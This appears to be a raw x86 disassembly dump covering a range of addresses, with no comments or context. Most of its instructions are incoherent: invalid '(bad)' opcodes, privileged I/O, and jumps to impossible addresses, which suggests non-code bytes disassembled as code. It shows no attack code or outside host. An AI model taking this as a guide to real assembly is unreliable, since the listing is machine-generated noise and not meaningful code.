  421022:	jb     0x421024
	...
  42104c:	popa   
  42104d:	sahf   
  42104e:	cld    
  42104f:	dec    DWORD PTR [edx]
  421051:	imul   BYTE PTR [edx+0x69]
  421054:	adc    eax,DWORD PTR [edx]
  421056:	jno    0x421086
  421058:	sbb    ebx,edi
  42105a:	push   0x3bf1c00
  42105f:	push   ecx
  421060:	sub    BYTE PTR [eax-0x2b],dh
  421063:	jae    0x421073
  421065:	mov    eax,ebx
  421067:	call   DWORD PTR [ebx+0x105103c1]
  42106d:	rcl    dl,1
  42106f:	inc    eax
  421070:	hlt    
  421071:	iret   
  421072:	mov    ebx,0x3d61c3e
  421077:	push   ecx
  421078:	call   0xd5aee52c
  42107d:	fwait
  42107e:	mov    ah,0x3e
  421080:	sbb    al,0xb6
  421082:	add    edx,DWORD PTR [ecx-0x30]
  421085:	(bad)  
  421087:	jae    0x421057
  421089:	add    al,BYTE PTR [ecx]
  42108b:	jmp    0x16df:0x71b4f11c
  421092:	mov    cl,0x4d
  421094:	in     eax,0x2
  421096:	add    DWORD PTR [esi],ecx
  421098:	sbb    eax,0xcf71b511
  42109d:	cmc    
  42109e:	mov    dl,0x46
  4210a0:	retf   
  4210a1:	rol    DWORD PTR [eax],0x71
  4210a4:	test   al,ch
  4210a6:	mov    ecx,0xdeeb8c5e
  4210ab:	arpl   WORD PTR [eax-0x28],di
  4210ae:	add    BYTE PTR [esi],dh
	...
  4210d8:	add    BYTE PTR [ebx+ebx*8],bl
  4210db:	sahf   
  4210dc:	bound  esi,QWORD PTR [eax+0x19]
  4210df:	mov    ds:0x4367863,eax
  4210e4:	sub    bl,BYTE PTR [ecx+eiz*1]
  4210e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4210e8:	jae    0x42115e
  4210ea:	xchg   ecx,eax
  4210eb:	mov    ch,0x73
  4210ed:	sbb    esp,DWORD PTR ds:[edx+0x417415e]
  4210f4:	inc    edi
  4210f5:	sbb    al,0x95
  4210f7:	mov    eax,ds:0xb8173760
  4210fc:	(bad)  
  4210fd:	mov    ebx,0x3d03ce5b
  421102:	inc    edx
  421103:	or     eax,0x1b3e3ea2
  421108:	add    al,0xfa
  42110a:	pop    edx
  42110b:	or     ah,BYTE PTR [eax-0x48f3b1f8]
  421111:	add    BYTE PTR [esi],bh
  421113:	adc    ch,BYTE PTR [ecx+0x42b5b0f]
  421119:	or     eax,0x7ba7fd38
  42111e:	shr    BYTE PTR [ecx-0x34c812fd],cl
  421124:	test   al,0xfc
  421126:	inc    esi
  421127:	out    0x3,eax
  421129:	and    bl,BYTE PTR [ebx-0x27]
  42112c:	test   al,0xbc
  42112e:	dec    eax
  42112f:	out    0x3,eax
  421131:	fstp   DWORD PTR [edx-0x46]
  421134:	test   al,0xcf
  421136:	dec    ebp
  421137:	(bad)  
  421138:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421139:	mov    ah,0x41
  42113b:	mov    bh,0xb7
	...
  421165:	add    BYTE PTR [ebx],bh
  421167:	rol    bh,cl
  421169:	add    ecx,ecx
  42116b:	sub    eax,0x3bafd6a8
  421170:	cdq    
  421171:	mov    bh,0xae
  421173:	dec    edx
  421174:	out    0x3,eax
  421176:	xchg   ecx,eax
  421177:	dec    esi
  421178:	xchg   esi,eax
  421179:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42117a:	test   BYTE PTR [esi+0x3f7fe1b9],cl
  421180:	add    DWORD PTR [ebx],0x57
  421183:	pop    ebx
  421184:	fwait
  421185:	mov    ds:0xb53c375a,al
  42118a:	jle    0x4211d9
  42118c:	aaa    
  42118d:	mov    dh,0x78
  42118f:	cmp    DWORD PTR [eax-0x60],eax
  421192:	jle    0x4211b0
  421194:	out    0x3,eax
  421196:	jnp    0x4211f3
  421198:	sbb    al,0xa2
  42119a:	inc    edi
  42119b:	inc    edx
  42119c:	dec    eax
  42119d:	test   al,0x6e
  42119f:	dec    esi
  4211a0:	add    BYTE PTR [edx+ecx*4+0x21],cl
  4211a4:	jb     0x4211e4
  4211a6:	xchg   BYTE PTR [eax],bh
  4211a8:	ins    BYTE PTR es:[edi],dx
  4211a9:	or     al,0x18
  4211ab:	dec    esi
  4211ac:	jno    0x4211b2
  4211ae:	jb     0x4211ec
  4211b0:	outs   dx,BYTE PTR ds:[esi]
  4211b1:	pop    ds
  4211b2:	mov    esi,0x1ffd6c3d
  4211b7:	pop    ebx
  4211b8:	add    cl,ch
  4211ba:	pop    ds
  4211bb:	pop    ebx
  4211bc:	add    cl,ch
  4211be:	pop    ds
  4211bf:	pop    ebx
  4211c0:	add    cl,ch
  4211c2:	pop    ds
  4211c3:	pop    ebx
  4211c4:	add    cl,ch
  4211c6:	pop    ds
  4211c7:	pop    ebx
  4211c8:	add    cl,ch
	...
  4211f2:	add    BYTE PTR [edi],bl
  4211f4:	pop    ebx
  4211f5:	add    cl,ch
  4211f7:	pop    ds
  4211f8:	pop    ebx
  4211f9:	add    cl,ch
  4211fb:	pop    ds
  4211fc:	pop    ebx
  4211fd:	add    cl,ch
  4211ff:	pop    ds
  421200:	pop    ebx
  421201:	add    cl,ch
  421203:	pop    ds
  421204:	pop    ebx
  421205:	add    cl,ch
  421207:	pop    ds
  421208:	pop    ebx
  421209:	add    cl,ch
  42120b:	pop    ds
  42120c:	pop    ebx
  42120d:	add    cl,ch
  42120f:	pop    ds
  421210:	pop    ebx
  421211:	add    cl,ch
  421213:	pop    ds
  421214:	pop    ebx
  421215:	add    cl,ch
  421217:	pop    ds
  421218:	pop    ebx
  421219:	add    cl,ch
  42121b:	pop    ds
  42121c:	pop    ebx
  42121d:	add    cl,ch
  42121f:	pop    ds
  421220:	pop    ebx
  421221:	add    cl,ch
  421223:	pop    ds
  421224:	pop    ebx
  421225:	add    cl,ch
  421227:	pop    ds
  421228:	pop    ebx
  421229:	add    cl,ch
  42122b:	pop    ds
  42122c:	pop    ebx
  42122d:	add    cl,ch
  42122f:	pop    ds
  421230:	pop    ebx
  421231:	add    cl,ch
  421233:	pop    ds
  421234:	pop    ebx
  421235:	add    cl,ch
  421237:	pop    ds
  421238:	pop    ebx
  421239:	add    cl,ch
  42123b:	pop    ds
  42123c:	pop    ebx
  42123d:	add    cl,ch
  42123f:	pop    ds
  421240:	pop    ebx
  421241:	add    BYTE PTR [eax],al
  421243:	lds    ebx,FWORD PTR [eax+eax*1+0x0]
  421247:	mov    ch,0x5c
  421249:	add    BYTE PTR [eax],al
  42124b:	mov    ch,0x5c
  42124d:	add    BYTE PTR [eax],al
  42124f:	lds    ebx,FWORD PTR [eax+eax*1+0x0]
  421253:	lds    ebx,FWORD PTR [eax+eax*1+0x0]
	...
  42127f:	add    BYTE PTR [ebp-0x4affffa4],dh
  421285:	pop    esp
  421286:	add    BYTE PTR [eax],al
  421288:	test   DWORD PTR [eax+eax*1+0x0],ebx
  42128c:	test   DWORD PTR [eax+eax*1+0x0],ebx
  421290:	jne    0x4212ee
  421292:	add    BYTE PTR [eax],al
  421294:	jne    0x4212f2
  421296:	add    BYTE PTR [eax],al
  421298:	test   DWORD PTR [eax+eax*1+0x0],ebx
  42129c:	test   DWORD PTR [eax+eax*1+0x0],ebx
  4212a0:	jne    0x4212fe
  4212a2:	add    BYTE PTR [eax],al
  4212a4:	jne    0x421302
  4212a6:	add    BYTE PTR [eax],al
  4212a8:	inc    ebp
  4212a9:	pop    esp
  4212aa:	add    BYTE PTR [eax],al
  4212ac:	inc    ebp
  4212ad:	pop    esp
  4212ae:	add    BYTE PTR [eax],al
  4212b0:	xor    eax,0x3500005c
  4212b5:	pop    esp
  4212b6:	add    BYTE PTR [eax],al
  4212b8:	inc    ebp
  4212b9:	pop    esp
  4212ba:	add    BYTE PTR [eax],al
  4212bc:	inc    ebp
  4212bd:	pop    esp
  4212be:	add    BYTE PTR [eax],al
  4212c0:	xor    eax,0xc900005c
  4212c5:	jecxz  0x4212b2
  4212c7:	push   ecx
  4212c8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4212c9:	adc    eax,0xe3248a08
  4212ce:	dec    edx
  4212cf:	call   DWORD PTR [edi+0x69c35ab5]
  4212d5:	in     al,0xeb
  4212d7:	push   ecx
  4212d8:	push   edx
  4212d9:	sub    BYTE PTR [ecx],dh
  4212db:	leave  
  4212dc:	js     0x4212c2
  4212de:	outs   dx,BYTE PTR ds:[esi]
  4212df:	xor    BYTE PTR [edi+0x8b0c48],dl
	...
  42130d:	push   0x6f
  42130f:	mov    DWORD PTR [esi+0x24],eax
  421312:	loop   0x421356
  421314:	cld    
  421315:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421316:	push   eax
  421317:	and    BYTE PTR [ebx+0x6b3cdb12],cl
  42131d:	dec    eax
  42131e:	pop    eax
  42131f:	cmp    BYTE PTR [edi],0x67
  421322:	inc    edi
  421323:	add    ch,bl
  421325:	lds    ebp,FWORD PTR [edi]
  421327:	pop    esi
  421328:	mov    eax,ecx
  42132a:	sub    eax,0xe449ccc1
  42132f:	jmp    0x4212b4
  421331:	mov    BYTE PTR [esi-0x77],dh
  421334:	inc    ebp
  421335:	and    al,0xe2
  421337:	inc    edx
  421338:	loopne 0x4212d1
  42133a:	sbb    eax,0xbae98be0
  42133f:	add    BYTE PTR [ecx+0x38],dl
  421342:	loop   0x421396
  421344:	in     al,0xa7
  421346:	adc    eax,0x52d48be4
  42134b:	add    DWORD PTR [ebp+0x14],ecx
  42134e:	loop   0x42139a
  421350:	clc    
  421351:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421352:	and    eax,0x76de8bf8
  421357:	add    DWORD PTR [ebp+0x14],eax
  42135a:	loop   0x42139e
  42135c:	call   0x8c3a30f8
  421361:	int    0x7a
  421363:	add    DWORD PTR [ebp+0x24],edx
  421366:	loop   0x4213ba
  421368:	lock xchg edi,eax
  42136a:	adc    eax,0x6ed48bf8
  42136f:	add    DWORD PTR [ebp+0x0],ecx
	...
  42139a:	and    al,0xe4
  42139c:	dec    edx
  42139d:	cld    
  42139e:	fistp  DWORD PTR [eax]
  4213a0:	hlt    
  4213a1:	add    BYTE PTR [ebx+ebx*2],bl
  4213a4:	add    bl,ch
  4213a6:	adc    eax,0x9ff452e2
  4213ab:	cdq    
  4213ac:	dec    BYTE PTR [eax+0x4588c749]
  4213b2:	in     al,0xe2
  4213b4:	dec    edx
  4213b5:	hlt    
  4213b6:	daa    
  4213b7:	and    ebx,DWORD PTR [eax]
  4213b9:	jae    0x42141f
  4213bb:	loop   0x42140f
  4213bd:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4213bf:	pop    ecx
  4213c0:	add    DWORD PTR [ebp+0x14],eax
  4213c3:	in     al,0x42
  4213c5:	fdiv   QWORD PTR [esi]
  4213c7:	pop    ebp
  4213c8:	push   0x1b1eac
  4213cd:	mov    esp,DWORD PTR [ecx-0x51]
  4213d0:	dec    esi
  4213d1:	call   0x427022
  4213d6:	lahf   
  4213d7:	xchg   edi,eax
  4213d8:	or     eax,DWORD PTR [ebp-0x74e6b7a4]
  4213de:	jmp    0x74879ca9
  4213e3:	pop    esi
  4213e4:	mov    ch,0xc
  4213e6:	in     al,dx
  4213e7:	jecxz  0x421433
  4213e9:	in     al,dx
  4213ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4213eb:	sub    ah,ch
  4213ed:	mov    ebx,ecx
  4213ef:	into   
  4213f0:	mov    BYTE PTR [esp+ecx*4],al
  4213f3:	pop    edx
  4213f4:	inc    ebx
  4213f5:	or     BYTE PTR [edi+0x60],dh
  4213f8:	mov    DWORD PTR [ebp+0x4c],ecx
  4213fb:	fidivr DWORD PTR [esi+0x4]
	...
  421425:	add    BYTE PTR [eax],al
  421427:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421428:	and    al,dh
  42142a:	jmp    0x4213ac
  42142c:	mov    al,al
  42142e:	mov    edi,DWORD PTR [ecx]
  421430:	xor    cl,al
  421432:	int3   
  421433:	push   0x60cccb9f
  421438:	lahf   
  421439:	retf   
  42143a:	int3   
  42143b:	pop    eax
  42143c:	lahf   
  42143d:	retf   
  42143e:	int3   
  42143f:	leave  
  421440:	loope  0x42142d
  421442:	or     DWORD PTR [eax],0x73
  421445:	call   0xfd10274f
  42144a:	mov    DWORD PTR [ecx-0x3d],esp
  42144d:	mov    BYTE PTR [ebp-0xc],al
  421450:	sub    ch,al
  421452:	sub    ebx,edi
  421454:	int    0xfc
  421456:	sbb    eax,0x56
  421459:	mov    eax,ds:0x1c72f4
  42145e:	push   0x4058a0
  421463:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421464:	pop    ds
  421465:	call   0xf4a9e7bb
  42146a:	jbe    0x4214c9
  42146c:	pop    ebx
  42146d:	mov    eax,ds:0x1c4af8
  421472:	push   0x1c
  421474:	inc    ecx
  421475:	add    BYTE PTR [eax-0x20],ch
  421478:	pop    eax
  421479:	inc    eax
  42147a:	add    BYTE PTR [ebx+0x5d76f867],ch
  421480:	pop    ebx
  421481:	xchg   DWORD PTR [ebp-0x7c],eax
  421484:	xchg   ebp,eax
  421485:	inc    edx
  421486:	cld    
  421487:	sbb    al,0x5b
	...
  4214b1:	add    BYTE PTR [eax],al
  4214b3:	add    BYTE PTR [edi+0x63],dh
  4214b6:	mov    DWORD PTR [ebp-0x80],edx
  4214b9:	fld    st(1)
  4214bb:	add    DWORD PTR [ebp-0xe7c03d9],esp
  4214c1:	into   
  4214c2:	pop    es
  4214c3:	jae    0x421502
  4214c5:	loop   0x421509
  4214c7:	cld    
  4214c8:	xchg   edi,eax
  4214c9:	pop    esi
  4214ca:	or     DWORD PTR [esi+ebx*1-0x58aeffe5],0x27
  4214d2:	call   0xf4a96029
  4214d7:	jbe    0x4214b6
  4214d9:	pop    edx
  4214da:	mov    DWORD PTR [ebp+0x38],ecx
  4214dd:	jecxz  0x4214e2
  4214df:	lea    ebp,[eax]
  4214e1:	inc    esp
  4214e2:	aas    
  4214e3:	add    BYTE PTR [edi],dh
  4214e5:	stos   BYTE PTR es:[edi],al
  4214e6:	mov    ch,ah
  4214e8:	rcr    DWORD PTR [ecx-0x60173335],0xcb
  4214ef:	int3   
  4214f0:	loopne 0x421491
  4214f2:	retf   
  4214f3:	int3   
  4214f4:	fcomp  DWORD PTR [edi-0x1f963335]
  4214fa:	jmp    0x42149d
  4214fc:	push   0x32003f44
  421501:	loopne 0x421542
  421503:	xor    BYTE PTR [edi-0x6ac1f7e2],dl
  421509:	and    ecx,DWORD PTR [eax]
  42150b:	pop    ebp
  42150c:	fistp  WORD PTR [edi-0x601f3335]
  421512:	retf   
  421513:	int3   
  421514:	fcomp  DWORD PTR [edi+0xcccb]
	...
  42153e:	add    BYTE PTR [eax],al
  421540:	add    BYTE PTR [ecx-0x20],ch
  421543:	jmp    0x4214d0
  421545:	popa   
  421546:	pop    edi
  421547:	push   eax
  421548:	mov    esp,DWORD PTR [ecx+0x63]
  42154b:	dec    edi
  42154c:	call   DWORD PTR [ecx]
  42154e:	(bad)  
  42154f:	jne    0x421592
  421551:	sbb    al,0x2e
  421553:	ror    esp,0x68
  421556:	lahf   
  421557:	retf   
  421558:	int3   
  421559:	pusha  
  42155a:	lahf   
  42155b:	retf   
  42155c:	int3   
  42155d:	pop    eax
  42155e:	lahf   
  42155f:	retf   
  421560:	int3   
  421561:	jmp    0x88c60145
  421566:	arpl   WORD PTR [edx+0x0],bp
  421569:	push   es
  42156a:	pop    ebx
  42156b:	push   0x1b1edc
  421570:	dec    DWORD PTR [ecx]
  421572:	shl    DWORD PTR [ebp+0x41],cl
  421575:	sbb    al,0xe2
  421577:	inc    edx
  421578:	clc    
  421579:	vpmulld xmm3,xmm7,XMMWORD PTR [eax+eiz*8]
  42157f:	inc    edx
  421580:	clc    
  421581:	in     al,dx
  421582:	ret    0xffb9
  421585:	cmp    ecx,esp
  421587:	add    ah,0x24
  42158a:	loop   0x4215ce
  42158c:	cld    
  42158d:	xchg   edi,eax
  42158e:	push   ds
  42158f:	adc    BYTE PTR [ecx-0x69],dl
  421592:	es or  al,0x52
  421595:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421596:	adc    eax,0x26135008
  42159b:	cld    
  42159c:	mov    eax,DWORD PTR [ecx]
  42159e:	cs ror esp,0x69
  4215a2:	loopne 0x42158f
  4215a4:	push   ecx
	...
  4215cd:	add    bl,ah
  4215cf:	adc    eax,0x5b1c00fc
  4215d4:	add    bl,ch
  4215d6:	adc    eax,0x9ffc42e0
  4215db:	call   0x4d88:0xcf6188fe
  4215e2:	ror    BYTE PTR [edi+0x6c4f104b],1
  4215e8:	mov    DWORD PTR [ebp+0x14],edx
  4215eb:	pop    eax
  4215ec:	push   ebx
  4215ed:	cld    
  4215ee:	sub    eax,DWORD PTR ds:0x5f618b02
  4215f4:	add    DWORD PTR [ebp-0x58],ecx
  4215f7:	pop    ebx
  4215f8:	mov    dh,0x11
  4215fa:	out    0x98,eax
  4215fc:	jae    0x421605
  4215fe:	aam    0x59
  421600:	add    BYTE PTR [eax],al
  421602:	sbb    al,0xc0
  421604:	add    ebp,ebx
  421606:	ins    BYTE PTR es:[edi],dx
  421607:	xchg   eax,eax
  421609:	mov    edi,DWORD PTR [ecx+0x2d]
  42160c:	ror    esp,0x68
  42160f:	sahf   
  421610:	retf   
  421611:	int3   
  421612:	pusha  
  421613:	sahf   
  421614:	retf   
  421615:	int3   
  421616:	pop    eax
  421617:	sahf   
  421618:	retf   
  421619:	int3   
  42161a:	leave  
  42161b:	fucomip st,st(3)
  42161d:	mov    ecx,0x5b34
  421622:	mov    eax,0x198906df
  421627:	pop    ds
  421628:	jne    0x42166b
  42162a:	sbb    al,0x2e
  42162c:	ror    esp,0x68
  42162f:	sahf   
  421630:	retf   
  421631:	int3   
	...
  42165a:	add    BYTE PTR [eax-0x62],ah
  42165d:	retf   
  42165e:	int3   
  42165f:	pop    eax
  421660:	sahf   
  421661:	retf   
  421662:	int3   
  421663:	leave  
  421664:	fucomip st,st(3)
  421666:	or     DWORD PTR [eax],0x6c
  421669:	mov    DWORD PTR [ebp+0x24],eax
  42166c:	fidiv  WORD PTR [edi+0x4]
  42166f:	sbb    al,0x5a
  421671:	test   BYTE PTR [eax-0x74ffa4e4],cl
  421677:	imul   edx,DWORD PTR [ebx-0x77],0xe9de1851
  42167e:	or     ch,cl
  421680:	mov    ch,0x86
  421682:	push   ebp
  421683:	call   0x9f4a595e
  421688:	fwait
  421689:	pop    es
  42168a:	mov    DWORD PTR [ecx-0x35],ebx
  42168d:	les    eax,FWORD PTR [ebp-0x38]
  421690:	pop    ebx
  421691:	add    BYTE PTR [eax],al
  421693:	sbb    al,0xb6
  421695:	push   es
  421696:	mov    ebp,DWORD PTR [ecx-0x39]
  421699:	add    cl,0x1d
  42169c:	aam    0x4a
  42169e:	cld    
  42169f:	xchg   edi,eax
  4216a0:	xor    ah,bh
  4216a2:	cmp    ecx,DWORD PTR [ecx-0x31]
  4216a5:	jo     0x4216ed
  4216a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4216a8:	and    ah,bh
  4216aa:	mov    esp,ecx
  4216ac:	retf   0xb70c
  4216af:	xor    BYTE PTR [edi+edi*4],bl
  4216b2:	cli    
  4216b3:	adc    dh,bl
  4216b5:	stc    
  4216b6:	add    esi,ecx
  4216b8:	mov    WORD PTR [ecx+0x4ad67045],cs
  4216be:	lock add BYTE PTR [eax],al
	...
  4216e5:	add    BYTE PTR [eax],al
  4216e7:	add    BYTE PTR [ebx],bl
  4216e9:	adc    dl,BYTE PTR [ecx+eax*2]
  4216ec:	popf   
  4216ed:	mov    ebp,0x5b1c0ffc
  4216f2:	xchg   DWORD PTR [ebp+0x54],edx
  4216f5:	(bad)  
  4216f6:	inc    edx
  4216f7:	or     BYTE PTR [edi+0x14030c18],dl
  4216fd:	(bad)  
  4216fe:	push   edx
  4216ff:	clc    
  421700:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421701:	pop    edi
  421702:	lsl    ebx,cx
  421705:	push   0xffffff89
  421707:	dec    ebp
  421708:	adc    al,0xd6
  42170a:	push   edx
  42170b:	or     al,0x1f
  42170d:	ins    BYTE PTR es:[edi],dx
  42170e:	mov    DWORD PTR [ebp+0x14],ecx
  421711:	aam    0x3
  421713:	or     al,BYTE PTR [edi]
  421715:	hlt    
  421716:	mov    BYTE PTR [ebp+0x14],dl
  421719:	(bad)  
  42171a:	inc    edx
  42171b:	or     BYTE PTR [edi],bl
  42171d:	sbb    eax,0x53618904
  421722:	out    0x6b,eax
  421724:	repz leave 
  421726:	cld    
  421727:	mov    eax,DWORD PTR [ecx]
  421729:	sub    cl,al
  42172b:	int3   
  42172c:	dec    ecx
  42172d:	(bad)  
  42172e:	jmp    0x4216b3
  421730:	enter  0x897e,0x45
  421734:	and    al,0xd4
  421736:	inc    edx
  421737:	in     al,0x97
  421739:	pop    ss
  42173a:	in     al,0x8b
  42173c:	imul   edi,DWORD PTR [edi-0x2c07af00],0x1fa7e852
  421746:	call   0x1cabd6
  42174b:	inc    DWORD PTR [eax]
	...
  421775:	sbb    al,0xd4
  421777:	dec    edx
  421778:	lock lahf 
  42177a:	inc    edi
  42177b:	lock add BYTE PTR [ebx],ah
  42177e:	(bad)  
  421780:	add    BYTE PTR [ebx+ebx*2],bl
  421783:	mov    DWORD PTR [ebp+0x14],edx
  421786:	pop    esi
  421787:	push   ebx
  421788:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42178a:	das    
  42178b:	loopne 0x421718
  42178d:	fnstcw WORD PTR [edx+0x5b0c7880]
  421793:	or     eax,0x5a7984
  421798:	add    dh,al
  42179a:	pop    edx
  42179b:	push   0x0
  42179d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42179e:	pop    ss
  42179f:	loopne 0x42172c
  4217a1:	icebp  
  4217a2:	push   edx
  4217a3:	add    DWORD PTR [ecx+0x10],edx
  4217a6:	sub    eax,0x503415fd
  4217ab:	aas    
  4217ac:	add    BYTE PTR [ebp-0x1e7403e1],ah
  4217b2:	mov    edx,0x4f1c3880
  4217b7:	pop    ss
  4217b8:	mov    ebp,DWORD PTR [ecx-0x45]
  4217bb:	mov    BYTE PTR [ebp+0x24],dl
  4217be:	pop    esp
  4217bf:	jns    0x45cae736
  4217c5:	cld    
  4217c6:	aam    0x4a
  4217c8:	or     BYTE PTR [edi],bl
  4217ca:	adc    edx,DWORD PTR [eax]
  4217cc:	mov    DWORD PTR [ecx-0x49],esp
  4217cf:	call   0xe070aeeb
  4217d4:	mov    ebx,DWORD PTR [ecx+0x53]
  4217d7:	add    DWORD PTR [edx+0x0],eax
	...
  421802:	sub    al,0xd2
  421804:	inc    edx
  421805:	hlt    
  421806:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421807:	push   ss
  421808:	loopne 0x421795
  42180a:	jno    0x42185f
  42180c:	add    DWORD PTR [ecx],edx
  42180e:	xchg   ebp,eax
  42180f:	cs in  al,dx
  421811:	(bad)  
  421812:	popa   
  421813:	ret    
  421814:	(bad)  
  421815:	call   FWORD PTR [ebx+ebx*2]
  421818:	mov    DWORD PTR [ebp-0x44],eax
  42181b:	fdiv   QWORD PTR [edi+0x10]
  42181e:	sbb    al,0x4f
  421820:	or     eax,0x80bae98b
  421825:	cmp    DWORD PTR [edi+ecx*2],ebx
  421828:	add    eax,0xfec2e1c7
  42182d:	call   FWORD PTR [ebx+ebx*2]
  421830:	mov    DWORD PTR [ebp+0x70],edx
  421833:	fdivr  QWORD PTR [ecx]
  421835:	add    al,ch
  421837:	cmp    DWORD PTR [ecx+0x7d47045],ecx
  42183d:	cmp    DWORD PTR [ebp+0x5b],0x4f9c0000
  421844:	sbb    al,0x8b
  421846:	jmp    0x144a119
  42184b:	enter  0xfffc,0xc3
  42184f:	sub    cl,BYTE PTR [ecx-0x17d5c7b3]
  421855:	mov    ch,0x31
  421857:	enter  0x83fc,0x60
  42185b:	push   ebx
  42185c:	xchg   DWORD PTR [ebp+0x40],eax
  42185f:	mov    ah,0x1b
  421861:	mov    esi,DWORD PTR [ecx-0x31]
  421864:	mov    BYTE PTR [edx],al
	...
  42188e:	add    BYTE PTR [edi+0x708d0815],ah
  421894:	push   ebx
  421895:	add    dl,BYTE PTR [edx-0x69]
  421898:	sbb    eax,0xf00450fc
  42189d:	cli    
  42189e:	push   ebx
  4218a0:	fcmovnb st,st(3)
  4218a2:	or     BYTE PTR [ebp+0x518bdc1d],dl
  4218a8:	mov    bh,0x88
  4218aa:	push   ebp
  4218ab:	clc    
  4218ac:	ror    DWORD PTR [esi],1
  4218ae:	mov    ebx,DWORD PTR [ecx-0x31]
  4218b1:	add    al,0x20
  4218b4:	rol    BYTE PTR [edx-0xc],cl
  4218b7:	xchg   edi,eax
  4218b8:	adc    eax,0x5edd83ec
  4218bd:	xchg   DWORD PTR [ebp-0x40],ecx
  4218c0:	mov    bl,0x94
  4218c2:	mov    edx,DWORD PTR [ecx-0x45]
  4218c5:	add    dl,0x8
  4218c8:	rcl    BYTE PTR [edx-0x20],cl
  4218cb:	test   DWORD PTR [eax-0x3],ebx
  4218ce:	call   DWORD PTR [ebx+0x5f5de2d3]
  4218d4:	xchg   esi,eax
  4218d5:	retf   
  4218d6:	int3   
  4218d7:	jmp    0x88c604af
  4218dc:	push   edx
  4218dd:	push   0x1b1ef0
  4218e2:	call   DWORD PTR [ecx]
  4218e4:	pop    ebx
  4218e5:	jne    0x421928
  4218e7:	sbb    al,0xd2
  4218e9:	inc    edx
  4218ea:	clc    
  4218eb:	(bad)  
  4218ec:	mov    BYTE PTR [ecx],0x40
  4218ef:	sbb    al,0xd4
  4218f1:	inc    edx
  4218f2:	clc    
	...
  42191b:	add    ah,ch
  42191d:	mov    dl,0x3d
  42191f:	std    
  421920:	inc    ebx
  421921:	mov    DWORD PTR [eax+0x42d224c4],0x1015a7fc
  42192b:	push   ecx
  42192c:	xchg   edi,eax
  42192d:	sub    eax,0x1d97520c
  421932:	or     BYTE PTR [eax+0x1b],dl
  421935:	xor    esp,edi
  421937:	mov    edi,ecx
  421939:	sub    cl,al
  42193b:	int3   
  42193c:	fcom   DWORD PTR [edi-0x2d963335]
  421942:	jmp    0x4218e5
  421944:	push   esp
  421945:	dec    esi
  421946:	aas    
  421947:	add    dl,bl
  421949:	pop    ebx
  42194a:	push   0x752b118b
  42194f:	inc    ecx
  421950:	sbb    al,0xd4
  421952:	dec    edi
  421953:	add    DWORD PTR [esi+0x1950879a],ecx
  421959:	sub    cl,al
  42195b:	int3   
  42195c:	fcom   DWORD PTR [edi-0x2d963335]
  421962:	jmp    0x4218e7
  421964:	enter  0x9f57,0x4c
  421968:	sub    ebx,DWORD PTR [eax+eax*1]
  42196b:	mov    ecx,esi
  42196d:	mov    al,bh
  42196f:	ds xchg edi,eax
  421971:	sbb    esi,DWORD PTR [eax]
  421973:	mov    ebp,DWORD PTR [esi-0x2e]
  421976:	sar    DWORD PTR [esi],1
  421978:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421979:	adc    ecx,DWORD PTR [ebx+ecx*4]
  42197c:	outs   dx,BYTE PTR ds:[esi]
  42197d:	aam    0x4a
  42197f:	hlt    
	...
  4219a8:	add    BYTE PTR [edi-0x1b740be0],dl
  4219ae:	push   esi
  4219af:	xchg   DWORD PTR [ebp+0x74],ecx
  4219b2:	rcl    BYTE PTR [edx-0x8],cl
  4219b5:	xchg   ebp,eax
  4219b6:	xor    ah,bh
  4219b8:	mov    eax,0x5b1d
  4219bd:	mov    eax,ds:0x9f44739b
  4219c2:	dec    eax
  4219c3:	clc    
  4219c4:	add    cl,dl
  4219c6:	pop    esi
  4219c7:	xor    eax,eax
  4219c9:	aaa    
  4219ca:	xchg   DWORD PTR [ecx+0x4ed2344d],ecx
  4219d0:	sbb    bh,dh
  4219d2:	das    
  4219d3:	or     BYTE PTR [ebp+0x5],dh
  4219d6:	rol    BYTE PTR [edx-0x8],cl
  4219d9:	xchg   edi,eax
  4219da:	sbb    BYTE PTR [ecx+ecx*4],cl
  4219dd:	mov    DWORD PTR fs:[di+0x14],edx
  4219e2:	rol    BYTE PTR [edx+0x10],cl
  4219e5:	xchg   ebp,eax
  4219e6:	sbb    BYTE PTR [eax],bl
  4219e8:	mov    eax,0x5b1d
  4219ed:	pop    es
  4219ee:	arpl   WORD PTR [ecx+0xed1f44d],cx
  4219f4:	mov    DWORD PTR [ecx-0x3d],edx
  4219f7:	mov    BYTE PTR [ebp-0x1c],al
  4219fa:	add    DWORD PTR [ebx-0x4],0xc0315f51
  421a01:	(bad)  
  421a02:	pop    esi
  421a03:	jmp    0x88dd29bb
  421a08:	in     eax,0x61
  421a0a:	call   0x0:0xcccb
	...
  421a35:	add    al,ch
  421a37:	xchg   esi,eax
  421a38:	retf   
  421a39:	int3   
  421a3a:	loopne 0x4219d2
  421a3c:	retf   
  421a3d:	int3   
  421a3e:	fcom   DWORD PTR [esi-0x2db63335]
  421a44:	jmp    0x4219d1
  421a46:	loope  0x421a9a
  421a48:	cmp    DWORD PTR [ebp+0x20],eax
  421a4b:	dec    edx
  421a4c:	add    eax,0xe952e18b
  421a51:	add    eax,0x45895977
  421a56:	sub    BYTE PTR [eax],ch
  421a58:	ror    esp,0x60
  421a5b:	xchg   esi,eax
  421a5c:	retf   
  421a5d:	int3   
  421a5e:	pop    eax
  421a5f:	xchg   esi,eax
  421a60:	retf   
  421a61:	int3   
  421a62:	leave  
  421a63:	shr    ebx,1
  421a65:	or     DWORD PTR [eax+0x76],0xffffffc5
  421a69:	inc    ebp
  421a6a:	push   eax
  421a6b:	pop    edx
  421a6c:	nop
